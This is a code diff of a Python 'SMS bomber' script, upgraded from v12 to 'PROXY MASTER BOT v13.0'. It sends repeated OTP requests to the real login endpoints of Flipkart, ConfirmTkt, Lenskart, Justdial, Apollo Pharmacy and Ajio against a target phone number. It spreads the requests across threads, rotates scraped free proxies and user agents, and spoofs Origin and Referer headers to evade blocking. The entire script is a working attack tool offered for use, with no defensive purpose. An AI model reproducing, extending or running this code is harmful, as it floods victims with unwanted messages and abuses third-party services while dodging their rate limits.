@@ -1,6 +1,8 @@
 import requests
 import os
 import time
+import random
+import json
 import threading
 
 # --- COLORS ---
@@ -11,98 +13,117 @@ W = "\033[0m"  # White
 
 success_count = 0
 failed_count = 0
+proxylist = []
 
-# ---------------------------------------------------------
-# 1. WORKING API DATABASE
-# ---------------------------------------------------------
-# Aapne kaha sirf Housing aur ConfirmTkt kaam kar rahe hain.
-# Naye APIs aap niche di gayi list mein add kar sakte hain.
-SMS_APIS = [
-    {
-        "name": "Housing.com", 
-        "method": "POST", 
-        "url": "https://login.housing.com/api/v2/send-otp", 
-        "json": {"phone": "{target}"}
-    },
-    {
-        "name": "ConfirmTkt", 
-        "method": "GET", 
-        "url": "https://securedapi.confirmtkt.com/api/platform/register", 
-        "params": {"newOtp": "true", "mobileNumber": "{target}"}
-    }
-    
-    # <--- APNE NAYE APIs YAHAN ADD KAREIN --->
-    # Example (POST): {"name": "Naam", "method": "POST", "url": "URL", "json": {"phone": "{target}"}},
-    # Example (GET):  {"name": "Naam", "method": "GET", "url": "URL", "params": {"mobile": "{target}"}},
-]
-
-def banner():
-    os.system("clear")
-    print(f"{G}========================================")
-    print("      🚀 CLEAN TURBO BOT v12.0        ")
-    print(f"========================================{W}\n")
-
-def send_request(api, target):
-    global success_count, failed_count
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
-    
+# --- 1. PROXY SCRAPER ---
+def fetch_proxies():
+    global proxylist
+    url = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all"
     try:
-        url = api["url"].replace("{target}", target)
-        
-        # Data/Params replacement logic
-        params = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("params", {}).items()} if "params" in api else None
-        json_p = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("json", {}).items()} if "json" in api else None
-        data_p = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("data", {}).items()} if "data" in api else None
+        r = requests.get(url, timeout=10)
+        proxylist = r.text.split()
+        print(f"{G}[*] {len(proxylist)} Proxies Loaded!{W}")
+    except:
+        print(f"{R}[!] Proxy Load Failed, using direct IP.{W}")
 
-        if api["method"] == "GET":
-            response = requests.get(url, params=params, headers=headers, timeout=5)
-        else:
-            response = requests.post(url, json=json_p, data=data_p, headers=headers, timeout=5)
+def get_random_proxy():
+    if proxylist:
+        return {'https': 'http://' + random.choice(proxylist)}
+    return None
 
-        if response.status_code == 200:
+# --- 2. USER AGENT GENERATOR ---
+def get_user_agent():
+    agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
+    ]
+    return random.choice(agents)
+
+# --- 3. MASTER REQUEST FUNCTION ---
+def send_otp(api_name, target):
+    global success_count, failed_count
+    ua = get_user_agent()
+    proxy = get_random_proxy()
+    
+    # --- SITE SPECIFIC LOGICS ---
+    try:
+        if api_name == "flipkart":
+            url = "https://rome.api.flipkart.com/api/7/user/otp/generate"
+            headers = {
+                "Origin": "https://www.flipkart.com",
+                "Referer": "https://www.flipkart.com/",
+                "X-user-agent": f"{ua} FKUA/website/42/website/Desktop",
+                "Content-Type": "application/json",
+                "User-Agent": ua
+            }
+            res = requests.post(url, json={"loginId": "+91" + target}, headers=headers, proxies=proxy, timeout=7)
+            
+        elif api_name == "confirmtkt":
+            url = f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={target}&newOtp=true"
+            headers = {"Referer": "https://www.confirmtkt.com/", "User-Agent": ua}
+            res = requests.get(url, headers=headers, proxies=proxy, timeout=7)
+
+        elif api_name == "lenskart":
+            url = "https://api.lenskart.com/v2/customers/sendOtp"
+            headers = {"Content-Type": "application/json", "x-api-client": "desktop", "User-Agent": ua}
+            res = requests.post(url, json={"telephone": target}, headers=headers, proxies=proxy, timeout=7)
+
+        elif api_name == "justdial":
+            url = "https://www.justdial.com/functions/whatsappverification.php"
+            data = f"mob={target}&vcode=&rsend=0&name=deV"
+            headers = {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "User-Agent": ua}
+            res = requests.post(url, data=data, headers=headers, proxies=proxy, timeout=7)
+
+        elif api_name == "apolopharmacy":
+            url = "https://www.apollopharmacy.in/sociallogin/mobile/sendotp"
+            headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua}
+            res = requests.post(url, data=f"mobile={target}", headers=headers, proxies=proxy, timeout=7)
+
+        elif api_name == "ajio":
+            url = "https://login.web.ajio.com/api/auth/generateLoginOTP"
+            headers = {"Content-Type": "application/json", "User-Agent": ua}
+            res = requests.post(url, json={"mobileNumber": target}, headers=headers, proxies=proxy, timeout=7)
+            if not res.json().get('success'): raise Exception("Ajio Logic Failed")
+
+        # Basic Status Check
+        if res.status_code == 200:
             success_count += 1
-            print(f"{G}[SUCCESS] {api['name']} - OTP Sent!{W}")
+            print(f"{G}[SUCCESS] {api_name} sent!{W}")
         else:
             failed_count += 1
-            print(f"{Y}[-] {api['name']} Status: {response.status_code}{W}")
+            print(f"{Y}[-] {api_name} failed (Code: {res.status_code}){W}")
 
-    except Exception:
+    except:
         failed_count += 1
-        print(f"{R}[!] Failed via {api['name']}{W}")
+        print(f"{R}[!] {api_name} Error (Proxy/Block){W}")
 
+# --- 4. MAIN INTERFACE ---
 def main():
-    banner()
+    os.system("clear")
+    print(f"{G}========================================")
+    print("      🚀 PROXY MASTER BOT v13.0        ")
+    print(f"========================================{W}\n")
     
-    target = input(f"{G}Enter Target Number: {W}")
-    limit = input(f"{G}Enter SMS Limit: {W}")
+    target = input(f"{G}Enter Number (without +91): {W}")
+    limit = int(input(f"{G}Enter Limit: {W}"))
     
-    print(f"\n{Y}Select Mode: 1. Serial (Stable) | 2. Threading (Turbo){W}")
-    mode = input("Choice: ")
+    print(f"\n{Y}[*] Fetching Fresh Proxies...{W}")
+    fetch_proxies()
 
-    if not target or not limit: return
-
-    limit = int(limit)
-    current_sent = 0
-
-    print(f"\n{G}[*] Launching on {target}...{W}\n")
-
-    if mode == "1":
-        while current_sent < limit:
-            for api in SMS_APIS:
-                if current_sent >= limit: break
-                send_request(api, target)
-                current_sent += 1
-                time.sleep(1)
-    else:
-        while current_sent < limit:
-            threads = []
-            for api in SMS_APIS:
-                if current_sent >= limit: break
-                t = threading.Thread(target=send_request, args=(api, target))
-                t.start()
-                threads.append(t)
-                current_sent += 1
-            for t in threads: t.join()
+    print(f"\n{G}[*] Attacking {target}...{W}\n")
+    
+    apis = ["flipkart", "confirmtkt", "lenskart", "justdial", "apolopharmacy", "ajio"]
+    
+    sent = 0
+    while sent < limit:
+        for api in apis:
+            if sent >= limit: break
+            t = threading.Thread(target=send_otp, args=(api, target))
+            t.start()
+            sent += 1
+            time.sleep(0.5)
+        time.sleep(1)
 
     print(f"\n{G}--- DONE | OK: {success_count} | FAIL: {failed_count} ---{W}")
 
